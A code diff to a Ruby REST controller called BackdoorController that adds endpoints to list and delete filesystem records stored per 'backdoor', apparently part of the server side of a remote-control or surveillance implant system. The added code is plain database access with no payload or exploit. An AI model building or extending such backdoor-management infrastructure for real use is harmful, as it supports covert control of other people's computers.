@@ -125,6 +125,29 @@ class BackdoorController < RESTController
     return STATUS_OK
   end
 
+  # retrieve the list of filesystem for a given backdoor
+  def filesystems
+    require_auth_level :server, :tech
+
+    list = DB.backdoor_filesystems(params[:backdoor])
+
+    return STATUS_OK, *json_reply(list)
+  end
+
+  def filesystem
+    require_auth_level :server, :tech
+
+    request = JSON.parse(params[:backdoor])
+
+    case @req_method
+      when 'DELETE'
+        DB.backdoor_del_filesystem(request['backdoor_id'], request['filesystem_id'])
+        trace :info, "[#{@req_peer}] Deleted the FILESYSTEM #{request}"
+    end
+
+    return STATUS_OK
+  end
+
 end
 
 end #DB::
